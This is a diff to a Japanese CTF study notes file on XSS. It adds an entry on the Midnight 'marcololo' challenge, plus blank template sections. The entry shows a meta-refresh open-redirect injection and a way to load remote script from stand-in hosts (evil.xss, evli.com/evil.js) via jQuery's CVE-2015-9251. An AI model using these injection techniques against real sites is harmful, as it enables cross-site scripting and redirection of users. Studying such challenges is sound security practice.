@@ -649,9 +649,63 @@ XSSではないので省略
 https://techblog.securesky-tech.com/entry/2018/10/31/2   
 
 ## 
+https://tasteofsecurity.com/security/ctf-midnight-marcololo/
+- **entrypoint**   
+```html
+<html><head>
+    <meta charset="UTF-8">
+    <link rel="stylesheet" href="/static/style.css">
+    <meta property="og:title" content="marcoloco">
+    <script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+    <script src="/api/getuser"></script>
+<script>
+
+if(user.name == "admin"){
+  $.get(location.hash.slice(1));
+}else{
+  document.write("u are not admin, fak off");
+}
+
+</script></head>
+```
+の`<meta property="og:title" content="marcoloco">`のcontent内に値を挿入できるが、`<`,`>`が使用できない。  
+なのでmetaタグを閉じることができないが、`0; url=http://evil.xss" http-equiv=“refresh`を送信すればオープンリダイレクトさせることはできる！  
+また、jqueryの3.0.0以下のバージョンではAjax通信先のデータをJSとしてリクエスト先ではなくリクエスト元のオリジンで実行できてしまう脆弱性(CVE-2015-9251)がある。  
+```txt
+jQuery before 3.0.0 is vulnerable to Cross-site Scripting (XSS) attacks when a cross-domain Ajax request is performed without the dataType option, causing text/javascript responses to be executed.
+```
+したがって、ハッシュ以降に`#http://evli.com/evil.js`みたいな感じでアクセスさせられればXSSできそう！  
+したがって、`if(user.name == "admin")`の条件に入る必要がある！  
+
+- **概要**   
+- **Payload**   
+## 
 - **entrypoint**   
 - **概要**   
 - **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+## 
+- **entrypoint**   
+- **概要**   
+- **Payload**   
+
 # Docker環境があるやつ
 ## somen (SECCON beginners 2020)
 https://github.com/SECCON/Beginners_CTF_2020  
